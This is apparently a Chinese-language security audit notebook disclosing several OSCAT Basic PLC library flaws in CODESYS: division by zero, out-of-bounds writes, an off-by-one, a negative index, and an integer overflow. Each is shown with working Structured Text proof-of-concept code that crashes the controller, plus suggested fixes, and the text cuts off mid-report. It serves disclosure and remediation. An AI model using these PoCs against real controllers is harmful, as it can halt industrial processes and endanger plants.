@@ -1,0 +1,690 @@
+库oscat_basic中函数漏洞
+
+2026年1月12日
+13:39
+
+以下所有漏洞环境：
+	1.oscat_basic 3.3.5.0
+	2.CODESYS V3.5 SP21 Patch 3
+	3.CODESYS Control Win V3 x64
+	4.Windows 11 家庭中文版
+
+漏洞分析报告：Division by Zero 导致的非预期逻辑死锁及拒绝服务 (CWE-369 / CWE-835 / CWE-400)
+漏洞类型：Division by Zero (CWE-369)
+
+1.摘要：在对工业控制系统广泛使用的开源组件库 OSCAT Basic 进行安全审计时，发现其 INC2 函数存在一处严重的边界校验缺失漏洞。当外部输入参数（如上界 U 和下界 L）被恶意构造为 U < L（例如 U = L - 1）时，会导致内部运算发生除数为零（MOD 0）的非法操作。在现代工业软 PLC 运行时（如 CODESYS Control Win V3 / Linux SL）中，该异常会被底层静默拦截并强制返回常量。此静默失败会毒化调用该函数的工业控制逻辑，导致依赖该函数进行状态流转的标准业务代码（如轮询、步进控制）陷入无限循环。这将在极短时间内触发 PLC 的系统级看门狗超时（Watchdog Timeout），强制控制器进入 EXCEPTION 停机状态，最终造成针对物理生产过程的拒绝服务攻击（DoS）。
+
+2.漏洞详情
+2.1 缺陷代码位置
+tmp := U - L + 1;
+INC2 := (X + D - L + tmp) MOD tmp + L;
+
+2.2根因分析
+INC2 函数被设计为在给定的上下界 [L, U] 范围内执行带偏移量的循环递增运算。然而，函数入口未对 L 和 U 的合法性进行有效校验。
+	
+	除零触发： 当攻击者或外部异常数据（如来自 HMI、上位机配方或 Modbus 报文）传入 U < L（例如 U = -1, L = 0）时，计算 tmp := U - L + 1 将导致 tmp = 0。随后执行 MOD tmp 即触发对零取模的非法算术操作。
+	
+	底层静默： 在现代工业级运行时环境中（如 CODESYS V3 架构），为了防止单一指令直接导致操作系统崩溃，底层运行时会捕获此异常（如拦截 SIGFPE 信号），并将结果静默置为 0。
+	
+	逻辑退化与死锁： 此时 (X + D - L + tmp) MOD 0 变为 0，最终 INC2 的返回值恒定为 0 + L，即常量 L。这使得 INC2 完全丧失递增功能。在工控软件中，该函数常被用于推进 WHILE 循环、FOR 循环或状态机，函数返回值的固化将导致控制流永远无法满足跳出条件，引发死循环（CWE-835）。
+	
+3.复现步骤
+	环境准备：安装 CODESYS V3.5 SP21 Patch 3，下载并导入 oscat_basic 3.3.5.0 库。添加设备 CODESYS Control Win V3 x64 或 CODESYS Control for Linux SL。
+3.1攻击向量准备
+在主程序调用该函数并设置函数参数如下：
+	X := 0 （任意值均可，为当前步数）
+	D := 0 （任意值均可，为步长）
+	L := 0 （下界）
+	U := -1 （上界，重点：值为 L - 1）
+	
+3.2复现代码
+	PROGRAM PLC_PRG
+	VAR
+	    index : INT := 0;
+	    input_L : INT := 0;
+	    input_U : INT := -1; (* 模拟被外部篡改或下发的恶意参数 *)
+	    trigger_vuln : BOOL := FALSE;
+	END_VAR
+	
+	(* 模拟工控循环任务 *)
+	IF trigger_vuln THEN
+	    index := input_L;
+	    (* 预期行为：index 每次增加 1，循环 10 次后跳出 *)
+	    (* 实际行为：由于漏洞存在，INC2 永远返回 input_L(即0)，导致死循环 *)
+	    WHILE index < 10 DO
+	        index := INC2(X := index, D := 1, L := input_L, U := input_U);
+	    END_WHILE;
+	    
+	    trigger_vuln := FALSE;
+	END_IF
+	
+3.3复现结果
+	无论输入 X 和 D 的值如何，INC2 函数始终返回常量值 L。
+	“在构建 PoC（漏洞验证代码）时，将恶意构造的边界参数（U=-1, L=0）传入 INC2 函数，将其置于一个预期步进 10 次的 WHILE 循环中。测试环境为主任务周期 10ms，看门狗超时阈值 2000ms。
+	执行结果： 漏洞成功触发，INC2 函数丧失计算能力，导致控制流陷入死循环。经过 2000ms 后，系统看门狗（Watchdog）精准捕获到任务卡死，底层抛出致命异常。PLC 瞬间强制转入 EXCEPTION 停机状态，造成彻底的系统级拒绝服务（System DoS）。
+	
+	
+	
+	
+	
+	
+
+
+4.影响评估
+	由于U - L + 1 = 0，即tmp = 0,产生了mod 0的操作，在codesys control win v3上测试不会崩溃，但此时无论X、D为何值，INC2 函数始终返回常量值 L。可能导致真实工业场景下系统对一个位置重复进行操作而无法处理其他位置，从而造成拒绝服务攻击（Dos）。
+	
+	
+	
+5.修复建议
+建议增加上下界合法性验证
+	IF U < L THEN
+		(* 可选策略：
+			1. 返回 L
+			2. 返回 X
+			3. 设置错误码（若支持）
+		*)
+		INC2 := L; 
+		RETURN;
+	END_IF;
+	
+6.函数源码
+	FUNCTION INC2 : INT
+	VAR_INPUT
+		X : INT;
+		D : INT;
+		L : INT;
+		U : INT;
+	END_VAR
+	VAR
+		tmp: INT;
+	END_VAR
+	tmp := U - L + 1;
+	INC2 := (X + D - L + tmp) MOD tmp + L;
+	
+	
+	漏洞分析报告：OSCAT Basic 库 _STRING_TO_BUFFER 函数越界写入导致的拒绝服务漏洞
+	漏洞类型： Out-of-bounds Write (CWE-787) / 内存破坏导致拒绝服务 (CWE-400)
+	受影响组件： OSCAT Basic 库 (版本 3.3.5.0 及之前版本)
+	1. 摘要
+	在对工业控制系统广泛使用的开源组件库 OSCAT Basic 进行安全审计时，发现其 _STRING_TO_BUFFER 函数存在严重的内存越界写入漏洞。该函数在将字符串复制到目标字节数组时，盲目信任外部传入的 SIZE 参数，且内部强制使用大数组指针（ARRAY[0..32767] OF BYTE）进行映射，未能校验目标缓冲区的真实物理边界。攻击者或恶意报文可通过传入超长的 SIZE 参数，迫使函数将超长字符串写入目标缓冲区之外的相邻内存区域。在工业控制系统中，这种内存破坏可被精准利用于覆盖相邻的关键指针变量。一旦被篡改的指针被业务逻辑解引用，将直接触发操作系统底层的内存访问违例（Access Violation / Segmentation Fault），迫使 PLC 控制器瞬间进入 EXCEPTION 停机状态，造成严重的生产系统拒绝服务（DoS）。
+	2. 漏洞详情
+	2.1 缺陷代码位置
+	Structured Text
+	
+	FUNCTION _STRING_TO_BUFFER : INT
+VAR_INPUT
+    PT : POINTER TO ARRAY[0..32767] OF BYTE; // [缺陷1] 指针类型定义过于宽泛，映射了巨大内存
+    SIZE : UINT; // [缺陷2] 盲目信任调用者输入的 SIZE，作为写入上限
+END_VAR
+// ...
+end := MIN(pos + LEN(str), UINT_TO_INT(size)); // 仅根据输入 SIZE 和字符串长度截断
+FOR i := pos TO end DO
+    pt^[i] := ps^; // [缺陷3] 循环拷贝时，无真实缓冲区边界检查
+    // ...
+END_FOR;
+	2.2 根因分析
+	该漏洞的根本原因在于输入验证缺失与不安全的内存映射。在软 PLC 的应用层编程中，开发者通常只分配几十个字节的微型 Buffer，但通过 ADR() 取址传给 _STRING_TO_BUFFER 后，该函数内部统一按 32767 字节的巨大数组处理。此时，决定写入多少字节的唯一依据变成了用户输入的 SIZE 参数。若输入 SIZE 大于缓冲区的真实大小（SIZEOF(Buffer)），FOR 循环将毫无阻拦地越界踩踏后续内存，引发 CWE-787 越界写入。
+	3. 复现步骤
+	环境准备： 安装 CODESYS V3.5 SP21 Patch 3，下载并导入 oscat_basic 3.3.5.0 库。添加设备 CODESYS Control Win V3 x64 或 CODESYS Control for Linux SL。
+	3.1 攻击向量准备（指针覆盖模型）
+	构建一个极具破坏性的内存布局：在业务结构体中，声明一个仅有 5 字节的小缓冲区，紧随其后声明一个业务逻辑中需要使用的指针（TargetPtr）。通过传入超长的恶意 Payload 和错误的 SIZE 参数，使得越界字符精确覆盖 TargetPtr，将其篡改为非法的内存地址。
+	3.2 复现代码
+	1. 构造受害者结构体：
+	TYPE DUT_Crash :
+STRUCT
+    Buffer : ARRAY[0..4] OF BYTE;      // 实际只有 5 字节物理空间
+    TargetPtr : POINTER TO INT;        // 紧挨着 Buffer，极易被越界覆盖
+END_STRUCT
+END_TYPE
+	2. 主程序复现逻辑：
+
+	PROGRAM PLC_PRG
+VAR
+    // 恶意 Payload：前5个字节填满Buffer，后续的 'A' (16#41) 将覆盖指针 TargetPtr
+    attack_payload : STRING := '12345AAAAAAAAAAAAAAAAAAAA'; 
+	pBuffer : POINTER TO ARRAY[0..32767] OF BYTE; 
+    dummy_value : INT := 42;
+	victim_memory : DUT_Crash;
+    trigger_crash : BOOL := FALSE; 
+END_VAR
+	IF trigger_crash THEN
+    // 初始化：TargetPtr 指向合法的安全内存地址
+    victim_memory.TargetPtr := ADR(dummy_value);
+    pBuffer := ADR(victim_memory.Buffer);
+	// === 触发漏洞：越界写入 ===
+    // SIZE 设为 25，远超 Buffer 真实的 5 字节容量
+    _STRING_TO_BUFFER(
+        STR := attack_payload, 
+        POS := 0, 
+        PT := pBuffer, 
+        SIZE := 25  
+    );
+	// === 引发物理崩溃 (Access Violation) ===
+    // 此时 TargetPtr 的内存已被恶意字符 'AAAA...' 覆盖，变为了非法内存地址
+    // 尝试解引用并写入数据，将瞬间触发底层内存访问违例
+    victim_memory.TargetPtr^ := 999; 
+	trigger_crash := FALSE; 
+END_IF
+	3.3 测试结果与物理崩溃证明
+	
+	
+	
+	
+	
+	将程序下载至运行环境。当 trigger_crash 置为 TRUE 时：
+		1. _STRING_TO_BUFFER 发生越界写入，attack_payload 溢出部分将相邻的指针变量 TargetPtr 内存空间覆盖为无效的 ASCII 码值（如 16#41414141...）。
+		2. 代码继续执行至 victim_memory.TargetPtr^ := 999; 尝试解引用非法地址时，直接引发底层操作系统的页错误（Page Fault）。
+		3. CODESYS 运行时捕获到该致命错误，系统抛出 *EXCEPTION* [AccessViolation] occurred 日志，并精确定位了导致异常的源码偏移量（如 *SOURCEPOSITION* ... offset=49235）。
+		4. PLC 控制器瞬间强制切断所有输出，进入完全停机（STOP / 亮红灯）状态，成功造成了物理级的拒绝服务。(见附件：崩溃状态及日志截图)
+	4. 影响评估
+	在真实的工业控制场景（OT 环境）中，该漏洞构成极其致命的威胁：
+		• 毁灭性的系统宕机 (System DoS)： 工控软件中广泛使用结构体与指针进行内存映射。攻击者通过上位机、HMI 协议或恶意下发的配方数据，输入构造好的超长字符串，即可利用此越界写入漏洞精准击毁相邻的内存指针或系统栈帧。这将直接触发底层的硬件/操作系统级中断（Access Violation），导致 PLC 在毫秒级内死机。对于高可用性要求的连续生产线（如化工、电力、水处理），这意味全线非计划停机，造成巨大的经济损失甚至衍生物理灾难。
+		• 隐蔽的逻辑篡改： 若未导致崩溃，攻击者亦可控制溢出长度，静默篡改相邻的温度报警阈值、安全联锁标志等关键控制变量，且现有安全监控策略难以在代码层发现异常。
+	5. 修复建议
+	强烈建议摒弃目前的定长泛型数组映射机制，增加严格的边界防御：
+		1. 重构函数接口: 不应使用 POINTER TO ARRAY[0..32767] 这种欺骗编译器的危险写法。在 IEC 61131-3 较新标准中，应使用 VAR_IN_OUT 传递可变长数组以动态获取真实长度，或要求调用者同时显式传入目标缓冲区的真实物理容量 SIZEOF(Buffer) 并在函数内进行二次比对校验。
+		2. 安全防御逻辑: 在拷贝操作执行前，强制执行取小原则：Actual_Write_Len := MIN(SIZE, SIZEOF(Buffer))，彻底杜绝溢出可能。
+	6. 函数源码 (OSCAT 原始缺陷代码)
+	Structured Text
+	
+	FUNCTION _STRING_TO_BUFFER : INT
+VAR_INPUT
+	STR : STRING(STRING_LENGTH);
+	POS : INT;
+	PT : POINTER TO ARRAY[0..32767] OF BYTE;
+	SIZE : UINT;
+END_VAR
+VAR
+	ps : POINTER TO BYTE;
+	i: INT;
+	end: INT;
+END_VAR
+ps := ADR(str);
+end := MIN(pos + LEN(str), UINT_TO_INT(size));
+IF end > 0 THEN end := end -1; END_IF;
+FOR i := pos TO end DO
+	pt^[i] := ps^;
+	ps := ps + 1;
+END_FOR;
+	_STRING_TO_BUFFER := i;
+
+漏洞分析报告：OSCAT Basic 库 _STRING_TO_BUFFER 函数零长度绕过与差一错误漏洞
+漏洞类型： Off-by-one Error (CWE-193) / Out-of-bounds Write (CWE-787)
+受影响组件： OSCAT Basic 库 (版本 3.3.5.0 及之前版本)
+1. 摘要
+在对工业控制系统广泛使用的开源组件库 OSCAT Basic 进行安全审计时，发现其 _STRING_TO_BUFFER 函数存在一处严重的“差一错误”（Off-by-one Error）。当外部调用者严格约束写入长度 SIZE = 0 时，函数内部的边界计算逻辑发生失效，导致循环条件退化并强制向目标指针写入 1 个字节的数据。在工控软件开发中，SIZE=0 常被用作防御性的空操作（NO-OP）或协议解析的边界截断信号，该漏洞直接击穿了开发者的安全预期。
+进一步的漏洞利用（Exploitation）分析表明，尽管在现代 64 位操作系统（如 Linux/Windows）中，单一字节的小端序篡改常受限于 4KB 内存分页保护机制而引发静默数据损坏；但当该漏洞作用于多级指针（如句柄、二维数组或链表）时，攻击者可通过覆盖二级指针的最低有效字节（LSB），使其指向内存栈中的不可控脏数据。当系统对该脏数据进行地址解引用时，将瞬间触发底层的内存访问违例（Access Violation），导致 PLC 核心控制进程完全停机，造成物理级拒绝服务（DoS）。
+2. 漏洞详情
+2.1 缺陷代码位置
+end := MIN(pos + LEN(str), UINT_TO_INT(size));
+IF end > 0 THEN end := end -1; END_IF; // [缺陷点] 当 end=0 时，此判断失效
+FOR i := pos TO end DO // [缺陷点] 当 pos=0 且 end=0 时，退化为 FOR i:=0 TO 0
+    pt^[i] := ps^;
+    ps := ps + 1;
+END_FOR;
+2.2 根因分析
+该漏洞的本质是 IEC 61131-3 ST 语言的循环特性与边界修正逻辑的冲突：
+	1. 当用户意图不写入任何数据，传入 SIZE := 0 且 POS := 0 时，MIN 函数计算得 end := 0。
+	2. 随后的修正逻辑 IF end > 0 THEN end := end -1; END_IF; 原意是为了将长度转换为从 0 开始的数组索引。但当 end 已经为 0 时，条件不满足，end 保持为 0。
+	3. 程序进入循环：FOR i := 0 TO 0 DO。在 ST 语言规范中，FOR 循环包含边界值，因此该循环体会被强制执行且仅执行一次。
+	4. 结果导致 STR 的首字符被不可控地写入了 PT 指向的 [0] 偏移位置，形成经典的 1-byte Off-by-one 越界写入。
+3. 复现步骤
+环境准备： 安装 CODESYS V3.5 SP21 Patch 3，下载并导入 oscat_basic 3.3.5.0 库。添加设备 CODESYS Control Win V3 x64 或 CODESYS Control for Linux SL。
+3.1 攻击向量与高阶利用准备（双重解引用模型）
+为了在现代 64 位操作系统的内存保护机制下实现稳定的崩溃，采用“多级指针攻击模型”。构建一个正常指向合法内存的二级指针（POINTER TO POINTER），利用该漏洞精准覆盖其存储地址的最低位字节（LSB）。
+3.2 复现代码 (PoC)
+PROGRAM PLC_PRG
+VAR
+    dummy_value : INT := 123;
+    RealPtr : POINTER TO INT;
+    TargetPtr : POINTER TO POINTER TO INT; (* 攻击目标：二级指针 *)
+    
+    pBuffer : POINTER TO ARRAY[0..32767] OF BYTE;
+    trigger_crash : BOOL := FALSE;
+END_VAR
+IF trigger_crash THEN
+    // 1. 初始化合法内存链：TargetPtr -> RealPtr -> dummy_value
+    RealPtr := ADR(dummy_value);
+    TargetPtr := ADR(RealPtr);
+    
+    // 2. 将存在漏洞的缓冲写入函数，直接定位于二级指针之上
+    pBuffer := ADR(TargetPtr); 
+    
+    // 3. 触发漏洞：明确要求写入 SIZE=0 字节
+    _STRING_TO_BUFFER(
+        STR := 'A',   (* ASCII: 16#41 *)
+        POS := 0, 
+        PT := pBuffer, 
+        SIZE := 0     (* 触发 Off-by-one *)
+    );
+    // 此时，TargetPtr 所存地址的最低有效字节(LSB)被篡改为 16#41。
+    // 它已偏离 RealPtr，指向栈内未知的垃圾数据。
+// 4. 引发物理崩溃 (Access Violation)
+    // 第一级解引用获取垃圾数据，第二级解引用将垃圾数据作为 64 位内存地址强行访问
+    TargetPtr^^ := 888; 
+    
+    trigger_crash := FALSE;
+END_IF
+3.3 测试结果与崩溃证明
+将程序运行至 PLC 环境，触发 trigger_crash：
+	1. 尽管业务代码明确规定了 SIZE=0，但底层指针 TargetPtr 依然遭受了 1 字节的静态篡改。
+	2. 当执行 TargetPtr^^ 双重解引用时，由于底层 CPU 试图访问非法的页空间地址，直接触发硬件级页错误（Page Fault）。
+	3. 运行时系统抛出 *EXCEPTION* [AccessViolation] occurred 致命日志，PLC 主任务瞬间挂起，设备状态变为 STOP（红灯），造成完全的拒绝服务攻击。
+
+
+
+
+
+
+4. 影响评估
+该漏洞的危险性在于其对防御逻辑的穿透能力与隐蔽的内存破坏能力：
+	• 静默数据破坏 (Silent Corruption)： 在常规的一级指针或数组操作中，这 1 字节的越界可能不会立即导致崩溃（受限于操作系统的 4KB 页保护），而是篡改相邻变量的值。这种隐蔽的修改难以触发监控告警，可能导致工艺参数产生致命偏差。
+	• 高危拒绝服务 (System DoS)： 如本报告 PoC 证实，一旦该函数在复杂的工业控制流（如设备句柄传递、动态数据结构解析）中作用于多级指针区域，这 1 字节的偏差即可被转化为不可信的绝对地址访问，瞬间摧毁控制器的可用性，导致全厂非计划停机。
+5. 修复建议
+需要修正循环结束条件的计算逻辑，确保当检测到无可用写入空间（或长度为0）时，强行阻断循环的触发。
+建议修复代码：
+end := MIN(pos + LEN(str), UINT_TO_INT(size));
+// 修复逻辑：明确判断是否具备写入空间
+IF end > pos THEN 
+    end := end - 1; 
+ELSE 
+    // 强制使循环终点小于起点，利用 ST 语言特性阻止 FOR 循环执行
+    end := pos - 1; 
+END_IF;
+FOR i := pos TO end DO
+    pt^[i] := ps^;
+    ps := ps + 1;
+END_FOR;
+6. 函数源码 (OSCAT 原始缺陷代码)
+FUNCTION _STRING_TO_BUFFER : INT
+VAR_INPUT
+	STR : STRING(STRING_LENGTH);
+	POS : INT;
+	PT : POINTER TO ARRAY[0..32767] OF BYTE;
+	SIZE : UINT;
+END_VAR
+VAR
+	ps : POINTER TO BYTE;
+	i: INT;
+	end: INT;
+END_VAR
+ps := ADR(str);
+end := MIN(pos + LEN(str), UINT_TO_INT(size));
+IF end > 0 THEN end := end -1; END_IF;
+FOR i := pos TO end DO
+	pt^[i] := ps^;
+	ps := ps + 1;
+END_FOR;
+_STRING_TO_BUFFER := i;
+
+漏洞报告：OSCAT Basic 库 WEEKDAY_TO_STRING 函数数组越界漏洞
+漏洞类型：Improper Validation of Array Index (CWE-129) / Out-of-bounds Read (CWE-125)。
+
+2. 漏洞详情
+OSCAT Basic 库中的 WEEKDAY_TO_STRING 函数在处理数组索引时存在严重的逻辑缺陷。代码仅通过 MIN(LANG, LANGUAGE.LMAX) 限制了输入参数 LANG 的上限，却未能对下限进行有效验证。由于 LANG 为有符号整型，攻击者可构造恶意负数值（如 -256）传入。该负数将被直接赋值给内部索引变量 ly，并随后用于访问全局数组 language.WEEKDAYS 或 language.WEEKDAYS2。这将触发严重的数组越界读取（Out-of-bounds Read），导致程序尝试访问非法内存地址。在 CODESYS 运行时环境中，该操作会引发非法内存访问异常，迫使 PLC 进入异常停机状态，从而造成拒绝服务（DoS）。
+
+2.1 缺陷代码位置
+
+IF LANG = 0 THEN ly := LANGUAGE.DEFAULT; ELSE ly := MIN(LANG, LANGUAGE.LMAX); END_IF;
+
+2.2根因分析
+该漏洞代码试图通过 MIN(LANG, LANGUAGE.LMAX) 限制索引上限，但未能检查 LANG 的下限。由于 INT 类型是有符号整数，攻击者可以传入负数（例如 -256）。当 LANG 为负数时，MIN 函数返回该负数，导致程序随后使用该负数索引访问 language.WEEKDAYS2 数组，触发内存越界访问。
+
+3. 复现步骤
+	环境准备：安装CODESYS V3.5 SP21 Patch 3，下载库oscat_basic 3.3.5.0，并在codesys中导入oscat_basci库，新建项目后添加设备CODESYS Control Win V3 x64，在该项目的库管理中导入oscat_basic库
+3.1 攻击向量准备
+	WDAY := 1
+	LANG ：= -256 //负数构造
+	LX := 2
+
+3.2 复现代码
+PROGRAM PLC_PRG
+VAR
+    iWday : INT := 1;
+    iLang : INT := -256; (* 恶意负数输入 *)
+    iLx   : INT := 2;    (* 路由至 WEEKDAYS2 数组逻辑 *)
+    test_begin : BOOL := FALSE;
+END_VAR
+(* 调用漏洞函数 *)
+IF test_begin THEN
+	WEEKDAY_TO_STRING(WDAY := iWday, LANG := iLang, LX := iLx);
+END_IF
+
+3.3.测试结果
+函数和尝试访问language.weekday2[-256][1]，plc崩溃，日志报错
+
+
+
+
+
+4. 影响评估
+	拒绝服务 (DoS): 在测试中，传入 Payload 导致 PLC Runtime 抛出 Exception Code 0xC0000005 并进入 STOP/EXCEPTION 状态。在工业现场，这将导致生产线停机。
+
+5. 修复建议
+建议在函数逻辑中增加对 LANG 参数的下限检查。
+修复代码示例：
+IF LANG = 0 THEN 
+    ly := LANGUAGE.DEFAULT; 
+ELSE 
+    (* 新增：使用 MAX 限制下界为 0 或 1 *)
+    ly := MAX(0, MIN(LANG, LANGUAGE.LMAX)); 
+END_IF;
+
+6.函数源码
+FUNCTION WEEKDAY_TO_STRING : STRING(10)
+VAR_INPUT
+	WDAY : INT;
+	LANG : INT;
+	LX : INT;
+END_VAR
+VAR
+	ly : INT;
+END_VAR
+IF LANG = 0 THEN ly := LANGUAGE.DEFAULT; ELSE ly := MIN(LANG, LANGUAGE.LMAX); END_IF;
+IF wday < 1 OR wday > 7 THEN
+	RETURN;
+ELSIF LX = 0 THEN
+	WEEKDAY_TO_STRING := language.WEEKDAYS[ly, WDAY];
+ELSIF Lx = 2 THEN
+	WEEKDAY_TO_STRING := language.WEEKDAYS2[ly, WDAY];
+END_IF;
+
+全新崩溃策略：负数索引 + 脏指针解引用 (Negative Index & Garbage Pointer)
+我们放弃让它变成极大的正数，就让它老老实实变成一个负数 (-3)。
+下游业务场景设计为：多语言数字播报/显示系统。我们需要把解析出的数字（0-9）映射到一个字符串指针数组里，以获取对应的文本（"Zero", "One", "Two"...）。
+必杀逻辑推演：
+	1. 字符是意外的 -（ASCII 45）。
+	2. 计算 DigitIdx := BYTE_TO_INT(pStr^) - 48; 得到纯正的 -3（没有任何溢出，合情合理）。
+	3. 使用这个负数去访问指针数组：DigitPointers[-3]。
+	4. 这会读取数组内存地址之前 24 个字节处的数据（栈上的脏数据）。
+	5. 业务逻辑把这堆脏数据当成一个合法的指针，然后去读取或写入！
+	6. 解引用脏指针，无视任何数据类型保护，瞬间触发底层硬件级的 Access Violation，PLC 直接暴毙！
+
+漏洞分析报告：OSCAT Basic 库 REAL_TO_STRF 函数整数溢出引发的格式破坏与拒绝服务漏洞
+漏洞类型： Integer Overflow (CWE-190) / 格式契约破坏导致拒绝服务 (CWE-400)
+受影响组件： OSCAT Basic Library (版本 3.3.5.0 及之前版本)
+严重程度： 高 (High) - 可引发下游数据解析逻辑的严重内存违规并导致系统停机
+1. 摘要
+在对 OSCAT Basic 库进行审计时，发现 REAL_TO_STRF 浮点数格式化函数存在严重的整数溢出漏洞。在处理特定负数大数值时，内部变量超出 32 位有符号整数（DINT）的上限，发生数值回绕。该异常与函数内部的字符串拼接逻辑产生冲突，导致最终返回包含**双负号（如 --695...）**的畸形字符串。
+该漏洞严重破坏了工业软件开发中对“标准数值格式”的安全假设。当该畸形数据被传递给合法的下游业务逻辑（如数字提取、查表映射）时，未被预期的负号字符将导致数组索引计算出现负偏移。这会诱使下游代码读取非法的内存指针（脏指针），进而在解引用时瞬间触发系统级的内存访问违规（Access Violation），直接迫使 PLC 控制器进入 EXCEPTION 停机状态，造成毁灭性的拒绝服务（DoS）。
+2. 漏洞详情
+2.1 缺陷代码位置
+Structured Text
+
+O := ABS(in) * EXP10(N);
+REAL_TO_STRF := DINT_TO_STRING(REAL_TO_DINT(O));
+// ... 
+IF in < 0 THEN REAL_TO_STRF := CONCAT('-', REAL_TO_STRF); END_IF;
+2.2 根本原因分析
+	1. 上游整数溢出： 当 IN := -3599.0 且 N := 6 时，计算得到的 O 超出了 DINT 的最大上限，底层硬件（x64）将其回绕解释为负数。
+	2. 格式毒化： DINT_TO_STRING 生成了第一个负号。随后的 IF in < 0 判定再次于字符串头部追加负号，最终产生畸形输出 '--695.966720'。
+	3. 下游衍生灾难： 工业开发中，常使用 ASCII码 - 48 的公式将字符转换为 0-9 的整数索引。当意外遭遇第二个 -（ASCII 45）时，计算结果为 -3。若该值被用作指针数组或关键数据表的索引，将导致向后的内存越界读取。
+3. 复现步骤 (包含下游逻辑崩溃链)
+环境准备： 安装 CODESYS V3.5 SP21 Patch 3，添加设备 CODESYS Control Win V3 x64 或 Linux SL。
+3.1 攻击向量与合理下游场景准备
+构建一个工业现场合理的业务场景：数字状态映射与转换。
+PLC 需要剥离格式化字符串的符号，将剩余数字逐个转换为对应的多语言文本字符串（如将 1 映射为 'One'）。下游逻辑通过维护一个 POINTER TO STRING 的查表数组来实现高效转换。
+3.2 复现代码 (PoC)
+将以下代码写入主程序。这段代码展示了漏洞函数是如何利用“-3”这个负偏移，摧毁原本安全的指针解引用逻辑的：
+PROGRAM PLC_PRG
+VAR
+    SensorVal : REAL := -3599.0;
+    sResult : STRING[20];
+    // === 下游合理的业务变量 ===
+    ValueStr : STRING[20];
+    pStr : POINTER TO BYTE;
+    DigitIdx : INT; // 有符号整数，常规用法
+    // 0-9 数字文本的指针查表
+    DigitPointers : ARRAY[0..9] OF POINTER TO STRING;
+    TargetPointer : POINTER TO STRING;
+    DummyStr : STRING := 'Valid';
+trigger_crash : BOOL := FALSE;
+END_VAR
+IF trigger_crash THEN
+    // (初始化模拟：使查表数组拥有合法指针)
+    DigitPointers[0] := ADR(DummyStr);
+// 1. 漏洞触发：上游库函数生成了带双负号的畸形毒数据 '--695.966720'
+    sResult := REAL_TO_STRF(IN := SensorVal, N := 6, D := '.');
+// === 2. 合理的下游代码开始执行 ===
+    // 开发者合理的动作：剥离第一个负号，准备提取纯数字
+    IF LEFT(sResult, 1) = '-' THEN
+        ValueStr := DELETE(sResult, 1, 1); 
+        // 此时 ValueStr 依然是 '-695.966720' 
+    ELSE
+        ValueStr := sResult;
+    END_IF;
+pStr := ADR(ValueStr);
+// 开发者合理假设：此时的字符串只含有 '0'-'9' 和 '.'
+    WHILE pStr^ <> 0 DO
+        IF pStr^ = 16#2E THEN // 遇到 '.' 则跳过
+            pStr := pStr + 1;
+            CONTINUE;
+        END_IF;
+// 【崩溃导火索】
+        // 当 pStr^ 意外读取到第二个 '-' (ASCII 45) 时
+        // DigitIdx := 45 - 48 = -3
+        DigitIdx := BYTE_TO_INT(pStr^) - 48;
+// 【越界读取脏指针】
+        // 系统读取 DigitPointers[-3] 的内存区域（位于数组基址之前的栈空间）
+        // 抓取到了 8 个字节的随机脏数据，并将其视为一个合法的 64 位内存指针！
+        TargetPointer := DigitPointers[DigitIdx]; 
+// 【致命崩溃发生点：解引用脏指针】
+        // 尝试向该非法地址写入数据，瞬间触发操作系统的硬件级内存保护！
+        TargetPointer^ := 'Crash'; // <--- PLC 将在此处瞬间红灯死机！
+pStr := pStr + 1;
+    END_WHILE;
+trigger_crash := FALSE;
+END_IF
+3.3 测试结果与物理崩溃证明
+当 trigger_crash 置为 TRUE 后：
+	1. 双负号畸形字符串躲过了下游代码的单层符号过滤。
+	2. 计算产生的 -3 使得 TargetPointer 获取了一个错误的栈内存残值（脏指针）。
+	3. 执行 TargetPointer^ := 'Crash' 时，底层 MMU（内存管理单元）发现目标地址非法，抛出硬件页错误。
+	4. CODESYS 运行时瞬间捕获异常，抛出 *EXCEPTION* [AccessViolation] occurred 日志，并强制 PLC 切断所有输出进入 STOP 状态，成功引发拒绝服务（System-level DoS）。
+
+
+
+
+4. 影响评估
+该漏洞绝不仅是一个简单的数值计算错误，它是一种严重的格式契约破坏（Format Contract Violation）。 在现代工业软件架构中，REAL_TO_STRF 等底层库函数输出的格式是被广泛信任的。HMI 协议组装、自定义串口协议、条码打印机驱动等模块，都高度依赖这种特定的格式契约。一旦整数溢出导致输出了预期外的字符（双负号），极易在下游状态机、查表数组或 JSON 序列化器中引发连环灾难，轻则导致协议断链，重则如同本报告所示，直接引发内存崩溃导致整个控制系统宕机瘫痪。
+5. 修复建议
+建议在进行 REAL_TO_DINT 转换前添加边界检查。
+修复代码示例：
+O := ABS(in) * EXP10(N);
+// 添加边界检查
+IF O > 2147483647.0 THEN
+    // 处理溢出情况，例如限制最大值或报错
+    O := 2147483647.0; 
+END_IF;
+REAL_TO_STRF := DINT_TO_STRING(REAL_TO_DINT(O));
+
+
+5. 函数源码
+FUNCTION REAL_TO_STRF : STRING(20)
+VAR_INPUT
+IN : REAL;
+N : INT;
+D : STRING(1);
+END_VAR
+VAR
+O: REAL;
+i: INT;
+END_VAR
+N := LIMIT(0,N,7);
+O := ABS(in) * EXP10(N);
+REAL_TO_STRF := DINT_TO_STRING(REAL_TO_DINT(O));
+FOR i := LEN(REAL_TO_STRF) TO N DO REAL_TO_STRF := CONCAT('0', REAL_TO_STRF); END_FOR;
+IF n > 0 THEN REAL_TO_STRF := INSERT(REAL_TO_STRF, D, LEN(REAL_TO_STRF) - N); END_IF;
+IF in < 0 THEN REAL_TO_STRF := CONCAT('-', REAL_TO_STRF); END_IF;
+
+漏洞分析报告：OSCAT Basic 库 FSTRING_TO_MONTH 函数数组越界导致的拒绝服务漏洞
+漏洞类型： 数组越界读取 (Out-of-Bounds Read, CWE-125) / 拒绝服务 (CWE-400)
+受影响组件： OSCAT Basic 库 (版本 3.3.5.0 及之前版本)
+严重程度： 高 (High) - 可直接导致 PLC 运行时环境崩溃并停机 (System DoS)
+1. 摘要
+在对工业自动化领域广泛使用的开源组件库 OSCAT Basic 进行安全审计时，发现其 FSTRING_TO_MONTH 函数存在一处严重的数组越界安全缺陷。该函数在处理外部传入的语言选择参数（LANG）时，缺失了针对有符号整数的下界防护校验。攻击者或受污染的外部数据流若向该参数注入负数（如 -1），将导致内部数组指针发生下溢（Underflow）。在标准的工业运行时环境（如 CODESYS Control Win V3 / Linux SL）中，这种非法的负数索引会直接触发底层操作系统的内存访问违规（Access Violation / Page Fault），迫使 PLC 控制器瞬间进入 EXCEPTION 异常状态并全面停机，从而对依赖该控制器的物理生产过程造成破坏性的拒绝服务攻击（DoS）。
+2. 漏洞详情
